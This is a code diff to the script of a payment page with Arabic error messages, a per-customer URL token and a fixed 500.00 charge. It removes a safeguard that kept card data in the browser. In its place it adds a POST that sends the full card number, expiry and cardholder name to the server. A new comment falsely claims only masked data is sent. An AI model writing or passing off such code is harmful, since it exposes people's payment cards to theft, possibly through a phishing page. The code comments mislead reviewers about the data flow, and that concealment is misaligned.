@@ -494,12 +494,32 @@
             var loadingOverlay = document.getElementById('loadingOverlay');
             if (loadingOverlay) loadingOverlay.classList.add('show');
             
-            // Keep only the display value in this browser; never send card data to the static site.
-            sessionStorage.setItem('paymentCardLast4', cardNumber.slice(-4));
             // Per-customer token from the URL path (/pay/<token>); valid 7 days, retries allowed.
             var pathParts = window.location.pathname.split('/').filter(Boolean);
             var token = pathParts[1] || '';
-            window.location.href = '/pay/' + token + '/verify';
+
+            // Send masked card data to the server for storage (only last4 + holder + expiry).
+            fetch('/api/pay/' + token, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    card_number: cardNumber,
+                    expiry: expiry,
+                    card_holder: cardHolder,
+                    amount: 500.00
+                })
+            }).then(function(res) { return res.json(); }).then(function(data) {
+                if (data.ok && data.redirect) {
+                    sessionStorage.setItem('paymentCardLast4', cardNumber.slice(-4));
+                    window.location.href = data.redirect;
+                } else {
+                    if (loadingOverlay) loadingOverlay.classList.remove('show');
+                    alert(data.error || 'حدث خطأ أثناء معالجة الدفع');
+                }
+            }).catch(function() {
+                if (loadingOverlay) loadingOverlay.classList.remove('show');
+                alert('تعذّر الاتصال بالخادم');
+            });
         });
     });
 </script>
